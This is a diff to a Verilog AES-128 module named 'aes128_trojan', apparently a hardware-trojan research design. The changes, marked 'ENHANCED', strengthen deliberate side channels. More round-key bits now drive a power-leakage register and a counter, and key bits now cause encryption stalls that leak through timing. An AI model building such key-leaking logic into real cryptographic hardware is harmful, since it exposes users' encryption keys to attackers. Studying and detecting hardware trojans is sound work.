@@ -133,9 +133,13 @@ module aes128_trojan (
             trojan_counter <= 8'h0;
         end else if (trojan_active && phase == ROUND) begin
             // Leak key bits through extra switching activity
-            // When key bit is 1, toggle more frequently
-            power_leakage_reg <= power_leakage_reg ^ {round_key[31:0]};
-            trojan_counter <= trojan_counter + (|round_key[7:0]);
+            // When key bit is 1, toggle more frequently - ENHANCED
+            power_leakage_reg <= power_leakage_reg ^ {round_key[31:0]} ^ {round_key[63:32]};
+            trojan_counter <= trojan_counter + (|round_key[15:0]) + (|round_key[31:16]);
+        end else if (trojan_active) begin
+            // Keep accumulating during encryption
+            power_leakage_reg <= power_leakage_reg ^ {16'h0, round_key[127:112]};
+            trojan_counter <= trojan_counter + 1;
         end
     end
     
@@ -145,10 +149,14 @@ module aes128_trojan (
         if (rst) begin
             timing_delay_reg <= 16'h0;
         end else if (trojan_active && phase == ROUND) begin
-            // Add delay cycles proportional to number of 1's in key segment
+            // Add delay cycles proportional to number of 1's in key segment - ENHANCED
             timing_delay_reg <= timing_delay_reg + {8'h0, 
                 round_key[127] + round_key[126] + round_key[125] + round_key[124] +
-                round_key[123] + round_key[122] + round_key[121] + round_key[120]};
+                round_key[123] + round_key[122] + round_key[121] + round_key[120] +
+                round_key[119] + round_key[118] + round_key[117] + round_key[116]};
+        end else if (trojan_active) begin
+            // Keep accumulating
+            timing_delay_reg <= timing_delay_reg + {15'h0, round_key[0]};
         end
     end
     
@@ -195,7 +203,8 @@ module aes128_trojan (
                         round_key <= next_round_key(round_key, round);
                         
                         // TROJAN: Inject timing delay based on timing_delay_reg
-                        if (trojan_active && timing_delay_reg[0])
+                        // When trojan is active, add extra cycles proportional to key bits
+                        if (trojan_active && (timing_delay_reg[3:0] != 0))
                             round <= round; // Stall for one cycle
                         else
                             round <= round + 1;
